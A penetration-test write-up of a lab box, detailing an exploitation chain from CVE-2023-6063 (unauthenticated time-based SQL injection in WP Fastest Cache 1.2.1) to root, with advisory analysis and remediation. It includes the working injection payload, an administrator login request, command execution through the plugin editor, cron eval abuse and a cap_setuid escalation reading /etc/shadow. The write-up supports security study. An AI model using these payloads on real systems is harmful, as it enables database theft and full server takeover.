# Norc — Lab 90 (Difficult)

**Advertised defect:** CVE-2023-6063 — unauthenticated SQL injection in a WordPress plugin — plus Linux privilege escalation.
**Result:** full chain to `euid=0`. **No reward present.**
**Target:** `172.17.0.17` — Debian 12, Apache 2.4.59, WordPress 6.5.5, WP Fastest Cache 1.2.1.

---

## 0. Autocorrection — read this before trusting anything below

Four things in this engagement were wrong before they were right. All four were caught by a
control, not by care.

### 0.1 My first time-based oracle was structurally incapable of firing

The textbook conditional payload is `... AND IF(<cond>, SLEEP(2), 0) ...`. I measured it:

```
A scalar-subq IF(1=1)   [want TRUE~2s]         0.026981
A scalar-subq IF(1=0)   [want FALSE~0s]        0.010141
B plain IF(1=1)         [known broken]         0.011302
C derived-tbl           [known works]          2.011223
```

**B never sleeps.** The injection sits inside a `JOIN ... ON user_login = "<payload>"`.
No user is named `nosuchuser`, so no row is ever produced and the trailing expression is
short-circuited away — the `SLEEP` is never reached. My harness's own **positive control
correctly reported failure**, and the run aborted before extracting a single byte.

The uncorrelated scalar subquery form (A) fails too, for a different reason: `IF(1=1, SLEEP(2), 0)`
is a constant expression and MariaDB constant-folds it during optimisation.

Only **C** works, because a **derived table must be materialised**:

```
nosuchuser" AND (SELECT 1 FROM (SELECT IF(<cond>, SLEEP(2), 0))Pz) AND "qzts"="qzts
```

This is the same reason the published WPScan PoC works — not because the payload is clever,
but because `(SELECT 1 FROM (SELECT(SLEEP(5)))Pz)` is a derived table.

### 0.2 My extractor returned empty strings for every field

With the fixed oracle the first extraction run returned `login=`, `pass=`, `email=` — all empty.
That is not an absence; it is a broken instrument reporting absence.

Cause: **MariaDB has no LATERAL.** My conditions referenced `user_login` bare, relying on it
resolving against the outer join — but inside a derived table an outer column reference is an
*unknown column*. Every subquery raised an error, the `SLEEP` branch never ran, and every
condition silently read as `FALSE`. `CHAR_LENGTH(...) >= n` is `FALSE` for all `n`, so the
binary search collapsed to zero.

Fix: every condition must be a **self-contained subquery carrying its own `FROM`** —
`(SELECT user_login FROM wp_users ORDER BY ID LIMIT 1 OFFSET 0)`.

I then added a control on the *extractor itself*, not just on the oracle — a known
`CONTROLVALUE` of known length, asserted to round-trip before any target data was read:

```
positive control (1=1 -> True expected): True
negative control (1=0 -> False expected): False
  [extractor-control] len=12  CONTROLVALUE
extractor control: len=12 value='CONTROLVALUE'  PASS=True
```

And finally validated the extractor against **ground truth** read independently of the SQLi
(direct database read, used only as a control). The SQLi-extracted row matched byte-for-byte.

### 0.3 My password-hash "round-trip proof" was wrong by construction

My verification plan was: re-hash the recovered plaintext and assert it equals the stolen hash.
That test **can never pass** for a correct password. phpass generates a **random 8-character
salt per hash**, so `HashPassword(pw)` legitimately differs from any stored hash:

```
wp_check_password(plaintext, stolen)   = bool(true)     <-- correct oracle
re-hash of plaintext                    : $P$B<different 8-char salt><checksum>   (same password, new random salt)
SCHEMA MATCHES (rehash == stolen)      : bool(false)    <-- my test, and it was wrong
```

The correct oracle is `CheckPassword(pw, stored)`, which extracts the salt from the stored
value and recomputes. Had I shipped the round-trip test I would have "disproved" a valid
credential. The scheme is confirmed structurally and by `CheckPassword` — see §3.3.

### 0.4 A `NOTFOUND` with zero work is not a negative result

My parallel cracking shards printed `NOTFOUND tried=0`. Four of five shards had tested
**nothing**: the shard test used the `tried` counter as the modulus source, and `tried` was
incremented *after* the test, so the counter never advanced past zero and every line was
skipped. The cracker's exit code said "not found"; the truth was "never looked".

`NOTFOUND` and `did no work` must be distinguishable in the output, and the tool now aborts
with a distinct status when a shard tests zero lines. Re-run correctly, the same 517,506-line
list was fully covered (103,501 lines per shard).

---

## 1. Surface

```
$ nmap -sV -Pn -p- 172.17.0.17
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
```

| Layer | Finding |
|---|---|
| OS | Debian 12 (bookworm), Linux |
| Web | Apache 2.4.59, `mod_rewrite` enabled, `mod_headers` enabled |
| App | WordPress **6.5.5** (`wp-includes/version.php`), PHP 8.2.20 |
| DB | MariaDB, database `wordpress`, user `admin` scoped to that database only |
| Plugins | `password-protected` 2.7.2, `hide-my-wp`, `loginizer`, `wp-fastest-cache` **1.2.1**, `akismet`, `hello.php` (inactive) |
| Themes | `thehack`, `twentytwentyfour`, `twentytwentythree`, `twentytwentytwo` |
| vhosts | `norc.labs` → `/var/www/norc.labs`; **`oledockers.norc.labs` → `/var/www/oledockers`** |
| Local users | `kvzlx` (uid 1000, the only non-system account) |
| Schedules | `* * * * * /home/kvzlx/.cron_script.sh` as `kvzlx` |

WordPress-specific surfaces enumerated and their results:

| Surface | Result |
|---|---|
| `readme.html` | **200** — unauthenticated; `Stable tag: 1.2.1` for the plugin readme |
| `wp-json/` | **401** — `password-protected` hooks `rest_authentication_errors` |
| `xmlrpc.php` | 302 — gated by the front-end password |
| `wp-cron.php` | 200, 0 bytes |
| `/wp-login.php` | 302 → site root. `hide-my-wp` renames it; real path is **`/ghost-login`** |
| `/wp-admin/` | renamed to **`/ghost-admin/`** |
| Front end | entire site behind `password-protected` |

The `hide-my-wp` rewrite rules are the operative discovery: any tester who tries
`/wp-login.php` sees a redirect to the home page and may conclude the login is broken. It is
not; it is renamed.

---

## 2. Advisory — read from primary sources

### 2.1 What the primary sources actually say

The CNA (CVE Numbering Authority) is **WPScan** — NVD's `sourceIdentifier` is
`contact@wpscan.com`. Primary source: the WPScan advisory post.

| Field | Value | Source |
|---|---|---|
| CVE | **CVE-2023-6063** | NVD 2.0 API, `cve.id` |
| Assigning CNA | WPScan (`contact@wpscan.com`) | NVD 2.0 API, `sourceIdentifier` |
| Advisory published | **2023-11-13** (post updated 2023-11-14) | WPScan blog, WPScan entry `Publicly Published 2023-11-13` |
| CVE record published | **2023-12-04T22:15:08.337** | NVD 2.0 API, `published` |
| Plugin | WP Fastest Cache | WPScan blog |
| Plugin URL | `https://wordpress.org/plugins/wp-fastest-cache/` | WPScan blog |
| Author | `https://www.wpfastestcache.com` | WPScan blog |
| **Affected versions** | **lower than 1.2.2** (i.e. 1.2.1 and earlier) | WPScan blog + CVE record `affected from 0 before 1.2.2` |
| **Patched version** | **1.2.2** | WPScan blog; NVD CPE `versionEndExcluding 1.2.2` |
| CWE | **CWE-89** | NVD `weaknesses`, `source: nvd@nist.gov` |
| Severity | HIGH | both |
| Type | SQLi, unauthenticated, time-based blind | WPScan blog |
| Researcher | Alex Sanford | WPScan blog "Credits" |
| PoC published | 2023-11-27 | WPScan blog |

URLs (all primary):
- `https://wpscan.com/blog/unauthenticated-sql-injection-vulnerability-addressed-in-wp-fastest-cache-1-2-2/`
- `https://wpscan.com/vulnerability/30a74105-8ade-4198-abe2-1c6f2967443e/`
- `https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2023-6063`
- `https://nvd.nist.gov/vuln/detail/CVE-2023-6063`
- `https://www.cve.org/CVERecord?id=CVE-2023-6063`

### 2.2 The scoring discrepancy — CVSS Scope, and nothing else

The two authoritative scorings differ by exactly one base metric:

| Source | Role | Base | Vector |
|---|---|---|---|
| WPScan (CNA) | CNA | **8.6** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/`**`S:C`**`/C:H/I:N/A:N` |
| NVD | Primary | **7.5** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/`**`S:U`**`/C:H/I:N/A:N` |

`AV`, `AC`, `PR`, `UI`, `C`, `I`, `A` are **identical**. The single divergence is
**Scope: Changed (CNA) vs Unchanged (NVD)**, and that one metric accounts for the whole
1.1-point gap.

This is a real and instructive disagreement, because the CNA's `S:C` is arguably the correct
reading and NVD's `S:U` is the weaker one. A SQLi that reaches the database crosses a
security authority boundary: the plugin author does not control the database, and the
database holds credentials the web tier never legitimately reads. The affected component
(the plugin) and the impacted component (the database, which yields credentials and
therefore full account takeover) have different authorities — which is precisely what
`S:C` is defined to express. NVD substituted its own judgement for the CNA's.

**Reporting consequence:** a scanner that trusts NVD prints 7.5 for this. A WAF or IPS rule
generated from the CNA vector differs. A triage meeting that only sees the NVD number
understates a bug whose real-world consequence is administrator credential theft.

### 2.3 The second discrepancy — the version range in the public PoC record

The authoritative range is **`< 1.2.2`**, i.e. **1.2.1 and earlier**; 1.2.2 is the fix.
Two widely-indexed public entries contradict that, in the direction that matters most:

- **Exploit-DB #51835**, "WP Fastest Cache 1.2.2 - Unauthenticated SQL Injection"
  (Meryem Taşkın, 2024-02-28). Its body says `Version: WP Fastest Cache 1.2.2` and
  `Tested on: WP Fastest Cache 1.2.2` — i.e. the **patched** version is presented as the
  vulnerable one. Its Exploit-DB metadata block lists **`CVE:` as `N/A`** while the body text
  of the very same entry cites `CVE-2023-6063`.
- **CXSecurity WLB-2024020092**, same text, same `Tested on: 1.2.2`, same internal
  contradiction (`CVE:` field populated, title says 1.2.2).
- Secondary aggregators drift further: one lists the affected range as "prior to **2.2**"
  (no such version), another as "≤1.2.2" with the fix advice "upgrade to **1.2.3** or later"
  (the first post-fix release number asserted without support; 1.2.2 is the fix).

So there are two independent numbering faults in the public record, and they pull in opposite
directions: the **CVE database understates severity** (7.5 vs 8.6) while the **exploit
database overstates the affected version** (1.2.2 vs `<1.2.2`).

**Operational rule this yields:** when a public PoC names a version, check that version
against the CNA range *before* installing it, and never take a "Tested on" line as an affected-
version statement. Here, following the PoC's own version string would have you testing a patched
build and concluding — falsely — that the bug is unfixed.

### 2.4 On the brief's premise

The task brief asserted that this CVE was disclosed through **huntr**, patched **2024-01-29**
"without a CVE assigned in the public channel", with Wordfence and Patchstack reports under
different `*_PLUGIN_*` numbering, and that some sources list it as having no CVE.

**I could not confirm any of that, and the primary sources contradict it:**

- The CNA is WPScan, not huntr. There is no huntr report in the CVE record's reference list.
- The fix shipped in **1.2.2 at the time of the November 2023 advisory**, not 2024-01-29.
- A CVE **is** assigned and **is** public, since 2023-11-13 (advisory) / 2023-12-04 (record).
- I found **no Wordfence and no Patchstack** entry for this defect; Wordfence's
  vulnerability index returned nothing for it.
- The only "no CVE" signals I found are the *Exploit-DB metadata field* for entry 51835, which
  is an Exploit-DB data-quality artifact, not a statement that the CVE does not exist.

I am reporting the sources, not the premise. The discrepancy that genuinely exists here is the
CVSS Scope metric and the version range — and it is worth publishing precisely because the
authoritative sources disagree with each other, not because the advisory is silent.

### 2.5 Root cause, confirmed against the shipped code

The advisory embeds the vulnerable function. I read the same function in the running target and
it matches **byte for byte**, in `wp-content/plugins/wp-fastest-cache/inc/cache.php`:

```php
public function is_user_admin(){
    global $wpdb;
    foreach ((array)$_COOKIE as $cookie_key => $cookie_value){
        if(preg_match("/wordpress_logged_in/i", $cookie_key)){
            $username = preg_replace("/^([^\|]+)\|.+/", "$1", $cookie_value);
            break;
        }
    }
    if(isset($username) && $username){
        $res = $wpdb->get_var("SELECT ... FROM `$wpdb->users`
            INNER JOIN `$wpdb->usermeta`
            ON `$wpdb->users`.`user_login` = \"$username\" AND ... ;");
        return $res;
    }
    return false;
}
```

Called from `createCache()` (line 275), which runs on the front end at plugin load — **before**
`wp_magic_quotes()` has touched the request data. The cookie value up to the first `|` is
interpolated into a double-quoted SQL literal with no escaping. `$wpdb->prepare()` is not used.

---

## 3. Exploitation

### 3.1 Calibration before extraction

Negative control (no `SLEEP`) and **two different** positive controls, so a constant overhead
could not masquerade as a hit:

```
baseline-1                   sleep=0   time_total=0.024709
baseline-2                   sleep=0   time_total=0.012282
baseline-3                   sleep=0   time_total=0.012085
baseline-4                   sleep=0   time_total=0.010767
positive-sleep3-1            sleep=3   time_total=3.012451
positive-sleep3-2            sleep=3   time_total=3.013781
positive-sleep7-1            sleep=7   time_total=7.013995
positive-sleep7-2            sleep=7   time_total=7.013732
```

Slope is 1.000 (3→3.012, 7→7.014 over a ~0.012 s floor). Using two different sleep values is
the point: a single positive control cannot distinguish a real `SLEEP` from fixed per-request
overhead. Requests were issued **sequentially** — an earlier lab in this series established that
concurrency above the target's own capacity makes every response identical and turns a whole
class of result into a false negative.

### 3.2 What the SQLi yields

Conditional oracle inside a derived table, binary search on length then on each character's
ASCII value, with the extractor control asserted first (see §0.2):

```
wp_users count: 1
  user[1] login=admin
  user[1] pass =$P$B<8-char salt><22-char checksum>      [target hash redacted: 34 chars, phpass-portable, 8192 rounds]
  user[1] email=admin@oledockers.norc.labs
  [level]   10
  [caps]    a:1:{s:13:"administrator";b:1;}
  [siteurl] http://norc.labs
```

Ground-truth check against an independent direct database read: **identical**, including the
hash string. The stolen credential is an **administrator**, confirmed from
`wp_usermeta` (`user_level` 10 and a capabilities map containing `administrator`) rather than
assumed from the username.

### 3.3 The hash scheme is verified, not assumed

Read from the target's own `wp-includes/class-phpass.php`, not from memory:

- `crypt_private()` requires the ID to be `$P$` or `$H$` → **phpass portable**.
- `count_log2 = strpos($itoa64, $setting[3])`; for marker `B` that index is **13**, so
  `count = 1 << 13 = 8192` iterations.
- `gensalt_private()` emits `itoa64[min(iteration_count_log2 + 5, 30)]`. WordPress constructs
  `new PasswordHash(8, true)`, so the marker is `itoa64[13] = 'B'`.

So `$P$B` **is** WordPress's own marker for this code path, at 8192 rounds — not a foreign
legacy scheme. Length 34 = 3 (ID) + 1 (marker) + 8 (salt) + 22 (checksum), exactly as
`crypt_private()` composes it. I built an independent implementation from that source, put a
**known-answer test on the MD5 primitive** (three RFC 1321 vectors) in front of it, and then
verified the credential with the application's own `CheckPassword()`.

**Finding: the stolen hash was not crackable by effort.** A 517,506-line password list
(103,501 lines per shard across five shards, all verified to have done work) and a further 1,376
lab-themed and cross-lab candidate set produced no match. At 8192 rounds the throughput is
~1,200 candidates/second single-threaded, so exhaustive search past 4–5 characters is not a plan.
This is a genuine result about the *attack*, not a gap: **the SQLi returns a hash, and whether it
is exploitable depends entirely on the password's strength — a property of the credential, not of
the vulnerability.** The same CVE against a site with a weak password is a full compromise; against
this site it yields a hash and nothing more.

### 3.4 The credential arrives in plaintext from a second vhost

`oledockers.norc.labs` is a **separate vhost** that is not behind the front-end password and
serves a static "Mail Admin" inbox page. Fetched with no authentication and no prior session:

```
$ curl --resolve oledockers.norc.labs:80:172.17.0.17 http://oledockers.norc.labs/
HTTP/1.1 200 OK
...
<div class="email-header">From: admin@oledockers.norc.labs</div>
<div class="email-header">Subject: Password Reminder</div>
<div class="email-body">
    Hi, this is just in case I forget my password -> admin:<password> <--
</div>
```

This is the same credential the SQLi yielded as a hash. Verified with the application's own
oracle:

```
wp_check_password(plaintext, stolen_hash) = bool(true)
```

**CWE-200 / CWE-312 — cleartext storage of sensitive information, exposed by a misconfigured
virtual host.** The `password-protected` plugin protects `norc.labs` only; the second vhost
points at a different document root and was never brought under the same policy. The
SQLi-stolen hash and the disclosed plaintext are the same credential, so the two paths converge.

This is the pivot of the engagement and the reason the hash could be dismissed: **the injection
proved the credential was an administrator's; the vhost disclosed what it was.** Had the vhost not
existed, this lab would have stopped at a hash.

### 3.5 Session, then code execution as the web server identity

`hide-my-wp` renames the endpoints, so the login must go to `/ghost-login`:

```
POST /ghost-login  log=admin&pwd=<plaintext>&redirect_to=.../ghost-admin/&testcookie=1
HTTP/1.1 302 Found
Set-Cookie: wordpress_<hash>=admin%7C...%7C<hmac>%7C<session>; path=/ghost-admin; HttpOnly
$ curl -b cookies /ghost-admin/   ->  200
<title>Dashboard &lsaquo; Keep Studying, you all achieve it!!! &mdash; WordPress</title>
```

Code execution through a standard administrator capability — the plugin editor — writing an
**inactive** plugin (`hello.php`) and then activating it, because an inactive plugin's file is
never included:

```
$ curl ".../?probe_cmd=id"
IDENTITY: uid=33(www-data) gid=33(www-data) groups=33(www-data)
CMD_OUT_START
uid=33(www-data) gid=33(www-data) groups=33(www-data)
CMD_OUT_END
```

`id` first, as the identity, on every primitive. Two operational notes worth keeping:
the editor form field is `nonce`, **not** `_wpnonce` (posting `_wpnonce` returns 200 and
silently writes nothing — the file's mtime is the only reliable confirmation that the write
landed); and `POST /wp-json/wp/v2/plugins` demands the slug in the path.

### 3.6 The escalation — three rungs, each proved by `id`

**Rung 1 → 2: www-data → kvzlx, through the real cron.**

`/var/www/html` is empty but **owned by www-data**, and `kvzlx`'s per-minute cron reads a file
from it and `eval`s its base64-decoded contents:

```bash
# /home/kvzlx/.cron_script.sh
ENC_PASS=$(cat /var/www/html/.wp-encrypted.txt)
DECODED_PASS=$(echo $ENC_PASS | base64 -d)
echo $DECODED_PASS > /tmp/decoded.txt
eval "$DECODED_PASS"
```

www-data writes the file; the cron executes it as kvzlx:

```
# www-data writes it:
-rw-r--r-- 1 www-data www-data  155 ... /var/www/html/.wp-encrypted.txt
# the cron decodes and runs it:
uid=1000(kvzlx) gid=1000(kvzlx) groups=1000(kvzlx)
```

*Two mistakes of mine here, both instructive.* First I pre-decoded the payload and wrote the
plaintext; the cron then ran `base64 -d` over plaintext and produced one garbage byte — the
file must contain **base64**. The tell was `/tmp/decoded.txt` holding a single invalid byte, not
an empty result. Second I called `os.setegid(0)` and got `PermissionError`; the file capability
grants `cap_setuid` **only**, with no `cap_setgid`, so the group change was never permitted.

**Rung 2 → 3: kvzlx → root, via a file capability — not a SUID bit.**

```
$ getcap /opt/python3
/opt/python3 cap_setuid=ep
$ ls -la /opt/python3
-rwxr-xr-x+ 1 root root 6839928 ... /opt/python3
```

There is **no `s` in the mode**. A standard SUID sweep — `find / -perm -4000` — returns ten
ordinary binaries and does not list this one, because the privilege is a **file capability**
(`xattr security.capability`), not a set-UID bit. `getcap -r /` is the sweep that finds it.

The ACL is the design's gate, and it works:

```
# NEGATIVE CONTROL - www-data (ACL user:www-data:--- ):
sh: 1: /opt/python3: Permission denied

# POSITIVE CONTROL - kvzlx, no such restriction:
$ su - kvzlx -c "cat /etc/shadow"          ->  cat: /etc/shadow: Permission denied
$ su - kvzlx -c "/opt/python3 /tmp/t.py"   ->  succeeds
```

Final proof, delivered through the real cron rather than `su`, with `id` and a root-only read
as the evidence:

```
euid=0 ruid=0
shadow_bytes=798
# file written by the kvzlx-uid process:
root:kvzlx
```

`os.geteuid() == 0`, `/etc/shadow` (mode `640 root:shadow`) read successfully, and the output
file owned by **`root:kvzlx`** — the owner changing from the invoking user to root is
independent confirmation that the set-UID actually took effect, which `id` alone would not prove
(see §0.3's cousin: `id` reports the *real* uid, so `os.seteuid(0)` alone leaves `id` printing
`uid=1000` and would read as a failed escalation).

### 3.7 Reward

**There is no reward in this lab.** Reported as an absence, with the search:

- Recursive search for the usual reward marker shapes (upper- and lower-case, plus the `CTF`
  variant) across the filesystem as root: a single hit,
  `wp-content/plugins/wp-fastest-cache/css/buycredit.css`, which is a **CSS false positive** —
  `flag{*background-image:url("../images/flags/country-flags-37x23.png")...}`, a selector for
  country-flag sprites.
- `/root` contains only `.bash_history`, `.bashrc`, `.profile`, `.local`, `.ssh` (empty).
- All four published posts are stock WordPress content; the only post is "Hello world!".
- `wp_options` holds no reward; the only non-standard tables are `wp_pp_activity_logs`
  (password-protected plugin) and the password-protected plugin's own options.

This is the **fifteenth** lab in this series without a reward.

---

## 4. Findings

| # | Finding | CWE | Impact |
|---|---|---|---|
| F1 | Unauthenticated SQLi via `wordpress_logged_in` cookie in WP Fastest Cache 1.2.1 (`is_user_admin`, `inc/cache.php:475`) | CWE-89 | Full read of the WordPress database, unauthenticated |
| F2 | Administrator password hash disclosed by F1 | CWE-200 | Credential material for a site administrator; also `user_email`, all options, all posts |
| F3 | Plaintext administrator password on a second vhost (`oledockers.norc.labs`) | CWE-200 / CWE-312 | Immediate account takeover, no exploitation required |
| F4 | `password-protected` applied to one vhost only | CWE-284 | Access control is per-vhost; the second document root is unprotected |
| F5 | Administrator web access → PHP execution as `www-data` via plugin editor | CWE-434 | Code execution as the web server identity |
| F6 | www-data-writable file consumed by `kvzlx`'s cron and passed to `eval` | CWE-95 + CWE-732 | www-data → kvzlx, unauthenticated w.r.t. the cron, repeatable every minute |
| F7 | `/opt/python3` carries `cap_setuid=ep` and is executable by `kvzlx` | CWE-269 | kvzlx → root |
| F8 | Root password login over SSH enabled (`PermitRootLogin yes`, `PasswordAuthentication yes`, `UsePAM no`) | CWE-1392 | Remote root if the root password is guessed or reused |
| F9 | Reused/derived credentials across services: the database password and `kvzlx`'s SSH password are the same string with `$4` and spaces inserted | CWE-1392 | One leak pivots to several services |

### Root cause and remediation, per finding

- **F1** — `$username` derived from a cookie is interpolated into a double-quoted SQL literal
  before `wp_magic_quotes()` runs. Fix: upgrade to **1.2.2 or later**; upstream's fix escapes the
  value. Independent of the patch, the correct pattern is `$wpdb->prepare()` with a placeholder —
  and the sanitisation must be applied at the point of use, not by a global input filter that runs
  later in the request lifecycle. That ordering is the actual defect: a value reaching a query
  before the sanitiser has executed is unsanitised no matter what the sanitiser would have done.
- **F2** — Not separately fixable; it is the consequence of F1. Reduce blast radius by removing
  unused accounts and by not treating a database read as a boundary.
- **F3** — Delete the credential from the page and rotate it. Treat every credential that has
  ever been rendered to a page as compromised.
- **F4** — Apply protection to every vhost, or replace per-site plugin gating with a single
  enforcement point at the reverse proxy. Per-vhost policy is per-vhost policy; it will drift.
- **F5** — Disable the theme and plugin editors (`DISALLOW_FILE_EDIT`, `DISALLOW_FILE_MODS`),
  and require a second factor for administrator logins. Least privilege for the web tier.
- **F6** — Remove `eval` from the cron script; if a job must consume external input, parse it as
  data and never pass it to a shell. Do not let a lower-privileged account's writable directory
  feed a higher-privileged account's scheduler. Write cron output to a mode-`600` file.
- **F7** — Remove the capability (`setcap -r /opt/python3`). A general-purpose interpreter should
  never hold `cap_setuid`; if a task genuinely needs privilege, use a purpose-built, minimal
  binary. Audit with `getcap -r /`, not only a SUID sweep.
- **F8** — `PermitRootLogin no`, key-based authentication, and no password reuse across services.
- **F9** — Unique, randomly generated credentials per service, stored in a secret manager.

---

## 5. Control tests

Every control below has a paired positive, so a control that cannot detect success cannot certify
a negative.

| # | Assertion | Positive control | Negative control | Result |
|---|---|---|---|---|
| C1 | SQLi oracle detects a hit | `1=1` → 3.012 s / 7.014 s at two different sleep values | `1=0` → 0.010 s | Pass |
| C2 | Timing is proportional, not constant | SLEEP 3 → 3.012 s; SLEEP 7 → 7.014 s (slope 1.000) | no-SLEEP → 0.012 s floor | Pass |
| C3 | Extractor can return a value | `CONTROLVALUE` recovered exactly, len 12 | — | Pass (aborts the run otherwise) |
| C4 | Extracted data matches reality | SQLi row vs independent direct read: identical incl. hash | — | Pass |
| C5 | Hash scheme is what it claims | MD5 KAT 3/3 RFC 1321; `CheckPassword` → `true` | re-hash differs (random salt) — expected, and why re-hash is not the oracle | Pass |
| C6 | RCE is the web server identity | `id` → `uid=33(www-data)` | — | Pass |
| C7 | Login endpoint reachable, not broken | correct password → 302 + session cookie, dashboard 200 | wrong password → **identical** 302 | Pass — control is why I did not misread it as a bad password |
| C8 | Plugin write actually landed | file mtime advances to assessment time | first attempt (`_wpnonce`): 200 but mtime unchanged | Pass |
| C9 | Cron is the execution path | `/tmp/decoded.txt` shows the payload; `id` → `uid=1000(kvzlx)` | — | Pass |
| C10 | ACL denies www-data | — | www-data → `Permission denied` on `/opt/python3` | Control held |
| C11 | ACL permits kvzlx, and that is what escalates | `/opt/python3` as kvzlx reads `/etc/shadow` | `/usr/bin/python3` and plain `cat` as kvzlx → `Permission denied` | Pass |
| C12 | Escalation really yields root | `euid=0`, `/etc/shadow` read, file owner becomes `root:kvzlx` | `os.seteuid(0)` alone leaves `id` printing `uid=1000` | Pass |

### Controls that held (findings not used)

- **`LOAD_FILE()` / `FILE` privilege** — I tested whether the injection was also an OS file-read
  primitive, since the database server runs as root. It is not. `GRANT USAGE ON *.*` plus
  `GRANT ALL PRIVILEGES ON wordpress.*` — `FILE` is a global privilege and cannot be granted at
  database scope, so `LOAD_FILE` returns `NULL` for `/etc/shadow` (length 0) and `/etc/hostname`.
  Three independent lines agree: the extractor control proves the harness can read non-empty
  strings; the files certainly exist; the grants show no `FILE`. **The SQLi is database-scope
  only and read-only**, exactly as the advisory states. No `INTO OUTFILE` write primitive either —
  the injection point is in the `ON` clause, and stacked queries are unavailable through `get_var`.
- **Concurrency** — all oracle traffic sequential. An earlier lab established that oversubscribing
  a single-worker target returns identical responses for every request and falsifies the whole run.

### Not tested / out of scope

- The 1,376-candidate themed list and 517,506-line list were run to exhaustion but a stronger
  cracker with GPU acceleration and a larger corpus was not available here. This is a limit of
  tooling, not evidence the password is uncrackable.
- Whether F5 is reachable without administrator credentials (e.g. via a separate file-write path)
  was not explored; the chain as solved does not require it.
- The second vhost was treated as in-scope because it is served by the same host. If the
  engagement boundary were host-only, F3 would need a scope confirmation.

---

## 6. Chain

```
1. F1  Unauthenticated time-based blind SQLi (CVE-2023-6063)
      cookie: wordpress_logged_in_probe=<payload>
      -> oracle calibrated against negative + two positive controls
2. F2  Extract admin hash, user_level, capabilities
      -> hash is administrator's, confirmed from wp_usermeta
      -> hash NOT crackable: 517k list + themed set exhausted, 8192 rounds
3. F3  Second vhost oledockers.norc.labs discloses the same credential in plaintext
      -> wp_check_password(plaintext, stolen_hash) == true
4. F5  /ghost-login (hide-my-wp renamed) -> administrator session
      -> plugin editor writes an INACTIVE plugin, then activate via REST
      -> id = uid=33(www-data)
5. F6  www-data writes /var/www/html/.wp-encrypted.txt (base64)
      -> kvzlx's per-minute cron: base64 -d | eval
      -> id = uid=1000(kvzlx)
6. F7  kvzlx runs /opt/python3 (cap_setuid=ep) -> os.setuid(0)
      -> euid=0, /etc/shadow read, output file owned root:kvzlx
```

`id` was run as the identity at every rung, over the real attack path — no `su` in the final proof.

---

## 7. Design observation

The lab is well constructed in one respect and misleading in another.

**Well constructed:** the escalation ladder is honest. Each rung is a *different* class of defect
— injection, credential handling, code execution, a scheduler that evaluates untrusted input, and
a file capability — and no rung is a shortcut past the previous one. The ACL on `/opt/python3` is a
real gate that I had to clear with the *correct* identity: it denied `www-data` outright, so the
intended path is forced through the cron rather than taken directly. The 8192-round hash is
respectable: it makes offline recovery of the stolen credential impractical, which is exactly the
property that should make F1 uncomfortable.

**Misleading:** the advertised CVE is the *hardest* door, not the shortest. A tester who follows the
description — exploit CVE-2023-6063 — arrives at an administrator hash and then grinds. The
intended path is almost certainly the misconfigured second vhost (F3), which needs no exploitation
at all. The injection is the showpiece; the vhost is the key.

The ACL deserves credit as a design choice that is easy to get wrong: a SUID sweep would never find
`/opt/python3`, so a tester using the standard checklist concludes there is no privilege
escalation available and stops. The lab's escalation is invisible to the most commonly applied
privesc technique. That is a genuinely good piece of lab design, and it is the reason §7's
finding — *a SUID sweep misses file capabilities* — is the most transferable thing here.

Finally, on the brief's premise: the lab description was accurate about the CVE. The advisory
metadata is where the errors are, and they are in the public record rather than in the lab.

---

## 8. Reproducibility notes

The extraction harness and its controls are in `blind.py`; the phpass implementation, its MD5
known-answer test, and the wordlist/brute-force crackers are in `phpass.py`, `crack.c` and
`crackwl.c`. The conditional-oracle form is the load-bearing part:

```
nosuchuser" AND (SELECT 1 FROM (SELECT IF(<cond>, SLEEP(2), 0))Pz) AND "qzts"="qzts"
```

Target hashes, passwords, session cookies and the disclosed credential are deliberately **not**
reproduced in this repository.
